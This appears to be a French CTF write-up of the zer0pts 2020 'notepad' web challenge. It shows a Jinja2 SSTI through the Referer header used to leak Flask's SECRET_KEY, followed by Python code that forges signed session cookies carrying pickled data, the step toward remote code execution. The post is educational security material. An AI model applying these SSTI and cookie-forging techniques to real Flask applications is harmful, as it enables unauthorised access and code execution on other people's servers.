---
layout: post
title: zer0pts CTF 2020
---

Bonjour à tous,
ce premier article de ChaigncHackademy a pour objectif d'expliquer la solution d'un des challenges que l'équipe a résolu lors de la compétition CTF japonaise nomée **zer0pts**. L'équipe a donc terminé en 50em position sur cette compétition de niveau international regroupant plus de 500 équipes dans le monde entier.

![_config.yml]({{ site.baseurl }}/images/ctf/zer0pts_2020/scoreboard.png)

# zer0pts web 2020 : notepad 326

**Category:** web |
**Name:** notepad |
**Solves:** 50 |
**Description:** Remote Code Execution d'un serveur web python

*TLDR: we exploited a restricted SSTI to leak SECRET_KEY, then we use SECRET_KEY to forge Flask cookie. Within the session cookie we inject a python pickle object to archieve RCE.*

*Article à but educationel uniquement.*

## Intro
Notepad est un challenge web intéressant pour commencer car on dispose du code source, qui est téléchargeable ici si vous désirez expérimenter également.
Ce code app.py deploie une application python web grâce au framework Flask.

L'objectif est de prendre le controle du serveur en combinant deux vulnérabilités et ensuite lire le fichier flag.txt sur le serveur pour valider le challenge.

## 1 ) La vulnérabilité SSTI: Server Side Template Injection
Lors d'une erreur 404, le code suivant est utilisé. Ce code dispose d'une vulnerabilité classique assez connue.

{% highlight python %}
html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)

return flask.render_template_string(html), 404
{% endhighlight %}

Il s'agit d'une vulnerabilité du type SSTI: Server Side Template injection. En effet Flask permet l'utilisation de jinja2 pour générer du code html à partir d'un template, ces templates peuvent également contenir du code python. Donc un utilisateur controlant le contenu d'un de ces templates peut forcer l'execution de code python coté serveur.

#### Referer
{% raw %}
Dans ce code le paramètre de la fonction **flask.render_template_string** est formaté avec le **referer**. Donc en injectant le **referer** par exemple avec le payload {{7*7}} on se retrouve avec 49 affiché sur la page car jinja2 interpréte en python tout ce qui se trouve entre {{ et }}.
{% endraw %}

![_config.yml]({{ site.baseurl }}/images/ctf/zer0pts_2020/referer.png)

{% raw %}
Habituellement une vulnérabilité du type SSTI est suffisante pour prendre le controle total du seveur (RCE) mais avec ce challenge nous sommes limités au niveau des payloads autorisés. Par contre le payload ```{{config}}``` permet d'afficher les informations de configuration du service Flask, parmi ces informations se trouve ``` "SECRET_KEY = '\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I'" ```
{% endraw %}

## 2) Manipulate Flask session
Le cookie de session de Flask ressemble a ci-dessous.

{% highlight ruby %}
Cookie: session=.eJyNjN0KgkAQhV8l9gn8qRuhi8QdyWhlR2fNuTM2CF0lMBSK3j2UHqDLc77znbcYm-lmm2cjorfYXEUk2IOcU4W6dS2RmYwHqAli3T-5gmysfThVZMKlQ-nCsnrEVvqyvKDCVA2lQVadL_nFqunvW13CgItP0KFfeyzvgMbG6ydlW-14wO7Hg3muO1vdZDZy4NYNtYcdgZ5zE9M5cdokf-eikObIYMHq_V58Pl-KuEwD.EUVOgw.MrDJ86YWh82ztUne1EVterQh-qQ
{% endhighlight %}
Ce cookie est serialisé, salé, chiffré, signé puis encodé par Flask, il n'est donc pas possible pour un utilisateur de créer un cookie valide sans connaitre la clef de chiffrement secrete utilisé par Flask. Forte heureusement nous avons avec la SSTI trouvé la clef de chiffrement utilisée ```SECRET_KEY```.

Pour comprendre quels algorithmes Flask utilise pour forger ses cookies je vous invite à lire le code source du framework [directement ici](https://github.com/pallets/flask/blob/master/src/flask/sessions.py#L339). Flask repose sur la librairie itsdangerous.


Une fois ces algorithmes assimilés vous pouvez utiliser directement les fonctions de Flask pour serialiser et deserialiser des cookies avec le ```SECRET_KEY```
{% highlight python %}
import pickle
import base64
from flask.sessions import SecureCookieSessionInterface

class FlaskMockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def session_cookie_encoder(secret_key, session_cookie_structure):
    try:
        app = FlaskMockApp(secret_key)
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error]{}".format(e)
{% endhighlight %}

Une fois ceci réalisé nous pouvons altérer le contenu des cookies.
{% highlight python %}
SECRET_KEY = b'\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I'
cookie = [{'date': '2020-03-07 16:08:28', 'text': '', 'title': 'ChaigncHackademy'}]
cookie = base64.b64encode(pickle.dumps(cookie))
cookie = {'savedata': cookie}
cookie = session_cookie_encoder(SECRET_KEY, cookie)
print('Created Cookie', cookie)

# Created Cookie .eJwtjEsKwjAUAK8iOUFjuyp0U8hrjRjJI5_27SIRiv0JlRYU7y6K2xlmXmwJ6zWGR2D5i-0uLGeUwJkqhfo23Kx1q0sAtYVSjw_yIJeWw9Fbl34ZiiE1_l5GwYVpUGGlJuOQVM8FPUmFscu0gQm_vYUeeZuQ6ABdLH9PKzM90IT93--3re2jvwq5EP-x0ho5hwoaqh2dqm72RiYB7rWbcPDCHQgiRF0U7P3-ALFiQoI.EUcu3w.AsfNxH-1DQkNW8LGNadRGYmYi8E
{% endhighlight %}
